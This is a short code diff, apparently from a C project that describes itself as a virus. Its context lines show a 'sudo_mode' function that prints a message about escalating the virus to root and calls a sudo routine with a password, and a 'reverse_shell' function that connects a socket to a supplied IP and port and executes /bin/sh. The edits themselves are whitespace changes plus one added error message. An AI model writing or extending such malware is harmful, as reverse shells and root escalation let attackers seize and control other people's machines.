@@ -45,7 +45,7 @@ int sudo_mode(int argc, char ** argv){
 
   printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
   runSudo(passwd, escalate_vector, 0);
-  
+
   return 0;
 }
 
@@ -362,7 +362,7 @@ struct init_struct create_init_struct(char ** argv){
 
 int reverse_shell(int port, char*ip, char ** argv){
 
-  
+
   struct sockaddr_in revsockaddr;
 
   int sockt = socket(AF_INET, SOCK_STREAM, 0);
@@ -382,5 +382,6 @@ int reverse_shell(int port, char*ip, char ** argv){
   char * const args[] = {"/bin/sh", NULL};
   execve("/bin/sh", args, NULL);
 
+  perror("execvp failed...");
   return 0;
 }
